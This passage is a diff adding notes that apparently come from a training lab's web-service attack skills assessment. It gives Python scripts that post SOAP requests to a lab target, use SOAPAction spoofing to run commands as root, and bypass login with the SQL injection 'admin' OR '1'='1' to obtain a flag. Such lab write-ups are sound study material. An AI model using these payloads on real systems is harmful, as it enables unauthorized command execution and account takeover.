@@ -680,3 +680,61 @@ we have defined a DTD `pwn` with an `ENTITY` that will reference our hosted netc
 
 ![](Images/Pasted%20image%2020240309151951.png)
 
+## Web Service & API Attacks - Skills Assessment 
+
+we are tasked with assessing a SOAP web service that has a WSDL file at `http://<target>:3002/wsdl?wsdl`
+
+identify a SQLi vulnerability through SOAP messages and find the password of the user that has a username of `admin` 
+
+first lets send a request to view the WSDL file: 
+
+![](Images/Pasted%20image%2020240309152946.png)
+
+we can see that there is an operation for command execution: 
+
+![](Images/Pasted%20image%2020240309153240.png)
+
+we can use our previous python script to send a SOAP request that tries to use this method: 
+
+```python
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+![](Images/Pasted%20image%2020240309154225.png)
+
+we are blocked because the operation is only available for users in the internal network, so we can perform a SOAPAction spoofing attack by simply changing our script payload to use the `LoginRequest` operation while still calling the `ExecuteCommand`: 
+
+![](Images/Pasted%20image%2020240309154513.png)
+
+we can see that this attack works and that the server uses root permissions 
+
+now lets move on to sending login requests for the admin user to see what types of requests we will be sending 
+
+looking at the parameters in the WSDL file I can modify the script to be able to send login requests:
+
+```python
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin</username><password>test</password></LoginRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://10.129.133.171:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
+```
+
+our target will not respond unless we provide the correct SQLi payload so lets try including some payloads for the username and password: 
+
+```python
+import requests
+
+payload = "<?xml version='1.0' encoding='utf-8'?><soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:tns='http://tempuri.org/' xmlns:tm='http://microsoft.com/wsdl/mime/textMatching/'><soap:Body><LoginRequest xmlns='http://tempuri.org/'><username>admin' OR '1'='1</username><password>test</password></LoginRequest></soap:Body></soap:Envelope>"
+
+print(requests.post("http://10.129.133.171:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
+```
+
+with the above payload we get a response from the server and get the flag: 
+
+![](Images/Pasted%20image%2020240309161723.png)
+
